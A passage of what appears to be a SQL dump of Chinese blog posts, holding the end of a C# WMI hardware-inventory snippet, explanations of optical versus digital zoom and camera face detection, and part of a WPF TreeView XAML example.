/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MyInfo = mo[&quot;Name&quot;].ToString();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.WriteLine(&quot;显卡:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot; + MyInfo);<br />\r\n6.获取网卡信息（可以是多个网卡）：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; selectQuery = new SelectQuery(&quot;select * from Win32_NetworkAdapter&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; searcher = new ManagementObjectSearcher(selectQuery);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j = 0;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string kk;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (ManagementObject disk in searcher.Get())<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kk = disk[&quot;ProductName&quot;].ToString();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (kk.Contains(&quot;RAS&quot;) || kk.Contains(&quot;WAN&quot;) || kk.Contains(&quot;直接并行&quot;) || kk.Contains(&quot;数据包&quot;))<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.WriteLine(&quot;网卡&quot; + j + &quot;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot; + kk);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j++;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n7.获取声卡信息：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mc = new ManagementClass(&quot;Win32_SoundDevice&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; moc = mc.GetInstances();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MyInfo = &quot;&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (ManagementObject mo in moc)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MyInfo = mo[&quot;ProductName&quot;].ToString();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.WriteLine(&quot;声卡:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot; + MyInfo);<br />\r\n8.获取当前操作系统、当前用户、当前ip、计算机名称：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IPAddress[] ips;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ips = Dns.GetHostAddresses(System.Environment.MachineName);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.WriteLine(&quot;当前ip:&nbsp;&nbsp;&nbsp; &quot; + ips[0].ToString());<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.WriteLine(&quot;计算机名称: &quot; + System.Environment.MachineName.ToString());&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.WriteLine(&quot;当前用户:&nbsp;&nbsp;&nbsp; &quot; + System.Environment.UserName.ToString());<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //RegistryKey rk需要 using Microsoft.Win32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RegistryKey rk = Registry.LocalMachine.OpenSubKey(&quot;Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string s = rk.GetValue(&quot;ProductName&quot;).ToString() + &quot; &quot; + rk.GetValue(&quot;CSDVersion&quot;).ToString();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_streamWriter.WriteLine(&quot;当前操作系统:&quot; + s);</p>\r\n',0,1438331279,0,0),(157,26,'光学变焦和数码变焦','<p>数码相机的光学变焦倍数是不是越大越好?它跟电子变焦方式是什么关系啊?不是说光学变焦方式要好些吗?高手们能给我详细说下它们之间的关系吗?1光学变焦就是通过调节镜头(一个镜头里会有好几片玻璃组成透镜组,它们的相对位置是可以变动的,调节镜头就是里面的镜片在移动)改变透镜组的焦距.每个透镜都有自己特有的焦距这个你知道吧,比如远处的东西，你可以拉长透镜组的焦距,使它可以&quot;看到&quot;那么远(短焦看不到).所以光学变焦是真真实实的看到了远处的物体 2数码变焦(你所说的电子变焦)就跟你在电脑上看图片是点击是一个道理,越大越看不清楚,实际上就是把原图上扣下来一块,再把面积放大,你说能清楚吗?所以数码变焦可以说完全没用 3光学变焦的倍数是不是越大越好要取决你有没有拍摄远处物体的需要,爱好者以及时常有机会旅游的人建议选择6-10倍的,这样会使你在遇到&quot;可望不可及&quot;的美丽景物时不至于因为太远拍不到它而留下遗憾</p>\r\n',0,1438331866,0,0),(158,26,'相机的脸部识别技术','<p>面部自动识别 对焦的兴起 众所周知，要想顺利地完成拍摄，准确对焦和精确曝光是两个必要条件。对于消费类相机的人像拍摄来说，面部对焦一直是一个比较棘手的难题。因为受到生产成本的限制，消费类相机的对焦系统肯定不如数码单反相机先进，因此在对焦时需要花费更多的力气。而人脸本身的自然条件，又为对焦操作增添了一些麻烦。首先，人脸的轮廊高低不平，影响对焦点的准确选择。其次，人脸分泌的油脂容易反光，而不同肤色的人种又给精确曝光提出了更高的要求。 正是基于解决人像拍摄难题的考虑，所以面部自动识别对焦功能才得以快速普及。就其基本工作原理来看，主要是在影像处理器内增加一个控制模块，而这个功能模块的主要作用有二：第一是在像场中快速识别出人脸的位置所在，提高对焦操作速度。第二是对人脸进行精确的局部测光和色温分析，进而保证曝光的准确性。 最先拓荒 说到面部自动识别对焦功能的发展历史，尼康的facepriority面部倨先自动对焦功能可说是首创。由于该功能应用了美国identix公司开发的faceit脸部辨识技术，可以从像场中读取人脸轮廊以及眼睛、鼻子、嘴巴、耳朵之间的距离等信息，还会精确分辨皮肤的颜色。所以，只要是像场中出现人像，那么相机就会自动搜寻人脸并进行优先对焦。 虽然尼康算是面部自动识别对焦功能的发起人，但是第一个大张旗鼓，隆重推出该功能的厂家却是富士，即富士的fd(face detection)脸部自动识别拍摄技术。在推广fd技术的时候，富士主要针对以下两个卖点进行大力宣传：一、fd技术是世界上第一项通过相机内部的硬件来实现识别功能的技术，所以运行速度非常快，从功能开始到识别完成仅需要0.05秒。二、fd技术支持多张人脸自动识别，最多可同时识别10张人脸。 在尼康和富士之后，佳能、索尼等其它厂商也都推出了支持面部自动识别对焦功能的相机。 由于面部自动识别对焦功能的技术原理并不是十分复杂，所以在短期内得到快速普及。就不同厂商的面部自动对焦功能的效果来看，并没有太大的区别。用户需要注意的就是面部对焦的速度、可谡别人脸的数量、白平衡的准确性等重要参数即可。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>鼻子、眼睛、嘴巴可不是人类独有的特征，但相机能够从中辨认是人还是动物吗？能，而且非常迅速和精准。富士胶片今天发布的新一代长焦机FinePix S6500fd拥有一个特别的后缀，这标示了这款数码相机具备一个特殊的功能――&ldquo;脸部识别技术&rdquo;（Face Detection）。<br />\r\n在以往的拍摄中，如何处理人物和背景的关系一直是个麻烦的问题：如果人物不是在取景器的中间，相机就可能把焦点对在远处的背景，导致人物模糊；当人物和背景的亮度差别很大，则会导致人脸部曝光不足或过度。为了解决这些问题，专业的数码相机配备了&ldquo;5点、9点&rdquo;的对焦系统和&ldquo;面测光、点测光、包围测光&rdquo;测光系统，还要加上&ldquo;AE/AF锁&rdquo;。如此复杂的设置对拍摄者的经验和手指灵活性都是巨大的考验，而对于许多不具备这些功能的数码相机来说，拍摄者就完全束手无策了。富士&ldquo;脸部识别技术&rdquo;（Face Detection）技术的出现，则让这个难题不复存在。这一技术能够让相机自动识别画面中是否有人的脸部，并自动将人脸作为拍摄的主体。然后，相机在对焦和曝光控制方面都将针对人脸的状况来调整。这样，拍摄者就可以专注于构图和拍摄时机的把握，不会再被烦琐的操作分散精力。而且 &ldquo;脸部识别技术&rdquo;（Face Detection）是在富士独有的&ldquo;自然影像&rdquo;处理芯片中额外增加了专门的逻辑运算集成电路，因此可以说FinePix S6500fd所拥有的脸部识别完全是通过&ldquo;硬件&rdquo;来实现的。与以往的一些类似功能相比，富士的&ldquo;脸部识别技术&rdquo;（Face Detection）不但更快而且更强――识别人脸只需要0.05秒，对拍摄完全不产生影响；最多可同时识别十张人脸，即使是晚会这样的场景也难不住它。而且在回放模式中，&ldquo;脸部识别&rdquo;功能也可以实现以人脸作为画面的关键信息进行修剪或放大。<br />\r\n当前数码相机技术发展的重点是如何提高拍摄的成功率，比如前一段时间各厂商都纷纷把防抖作为主要的宣传点进行推广。而富士胶片在2005年成功推出&ldquo;自然影像&rdquo;技术后，一举解决了防抖、抓拍以及夜景等拍摄难题，使得普通用户不需要太多的学习也可以拍摄出清晰的照片。于是富士把研发的重点转移到如何获得准确的曝光这一难题上。2006年，富士率先在推出的相机上设置了&ldquo;自然光&amp;闪光&rdquo;模式，使用户不用担心会拍摄出失败的照片；随后又在FinePix F30上增加了&ldquo;智能闪光灯&rdquo;系统，大大提高了闪光灯使用下的拍摄成功率。现在，&ldquo;脸部识别技术&rdquo;（Face Detection）系统则再次提高了曝光的准确性，降低了拍摄者的负担。可以说，&ldquo;脸部识别技术&rdquo;（Face Detection）与&ldquo;自然影像&rdquo;技术一样，充分利用了数码摄影的技术特点，实现了胶片时代&ldquo;不可能完成&rdquo;的任务。<br />\r\n可以预见，随着&ldquo;脸部识别技术&rdquo;（Face Detection）广泛在数码相机中使用，小型数码相机拍不出好照片的情况将一去不复返了。</p>\r\n',0,1438331937,0,0),(159,38,'c#用TreeView显示树形菜单','<p>例子中给了五个树形菜单，第一个是简单的树形菜单，第二个是嵌套了按钮的树形菜单，第三个是父级是按钮，第四个是绑定了资源的树形，第五个是嵌套了图片的树形。<br />\r\n&lt;Window x:Class=&quot;SimpleTreeView.Window1&quot;<br />\r\n&nbsp;&nbsp;&nbsp; xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;<br />\r\n&nbsp;&nbsp;&nbsp; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;<br />\r\n&nbsp;&nbsp;&nbsp; Title=&quot;SimpleTreeView&quot;<br />\r\n&nbsp;&nbsp;&nbsp; &gt;<br />\r\n&nbsp;&lt;Window.Resources&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;Style TargetType=&quot;{x:Type TreeViewItem}&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Setter Property=&quot;Foreground&quot; Value=&quot;Blue&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Setter Property=&quot;FontSize&quot; Value=&quot;12&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/Style&gt;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;Style TargetType=&quot;{x:Type TextBox}&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Setter Property=&quot;Width&quot; Value=&quot;80&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Setter Property=&quot;TextWrapping&quot; Value=&quot;Wrap&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/Style&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;XmlDataProvider x:Key=&quot;myEmployeeData&quot; XPath=&quot;/EmployeeData&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;x:XData&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EmployeeData xmlns=&quot;&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EmployeeInfo&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EmployeeInfoData&gt;Employee1&lt;/EmployeeInfoData&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Item Type=&quot;FirstName&quot;&gt;桂素伟&lt;/Item&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Item Type=&quot;LastName&quot;&gt;刘靖凯&lt;/Item&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Item Type=&quot;EmployeeNumber&quot;&gt;张三&lt;/Item&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/EmployeeInfo&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EmployeeInfo&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;EmployeeInfoData&gt;Employee2&lt;/EmployeeInfoData&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Item Type=&quot;FirstName&quot;&gt;王五&lt;/Item&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Item Type=&quot;LastName&quot;&gt;赵六&lt;/Item&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Item Type=&quot;EmployeeNumber&quot;&gt;李四&lt;/Item&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/EmployeeInfo&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/EmployeeData&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/x:XData&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/XmlDataProvider&gt;<br />\r\n&nbsp;&lt;HierarchicalDataTemplate DataType=&quot;EmployeeInfo&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ItemsSource =&quot;{Binding XPath=Item}&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TextBlock Text=&quot;{Binding XPath=EmployeeInfoData}&quot; /&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/HierarchicalDataTemplate&gt;<br />\r\n&nbsp;<br />\r\n&nbsp;&lt;/Window.Resources&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;StackPanel&gt;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 简单的树形&lt;/TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeView&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Employee1&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Jesper&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Aaberg&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;12345&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Employee2&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Dominik&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Paiha&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;98765&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeView&gt;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 组合树形1<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeView&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header =&quot;Employee1&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem.Items&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Button&gt;Jesper&lt;/Button&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Button&gt;Aaberg&lt;/Button&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Button&gt;12345&lt;/Button&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem.Items&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Employee2&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem.Items&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Button&gt;Dominik&lt;/Button&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Button&gt;Paiha&lt;/Button&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Button&gt;98765&lt;/Button&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem.Items&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeView&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 组合树形2<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeView&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem.Header&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Button&gt;Employee1&lt;/Button&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem.Header&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Jesper&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Aaberg&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;12345&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem.Header&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;Button&gt;Employee2&lt;/Button&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem.Header&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Dominik&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Paiha&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;98765&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeViewItem&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TreeView&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 资源绑定的树形<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeView ItemsSource=&quot;{Binding Source={StaticResource myEmployeeData},<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XPath=EmployeeInfo}&quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 组合树形三<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/TextBlock&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeView&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem Header=&quot;Animals&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;TreeViewItem.Items&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;DockPanel&gt;<br 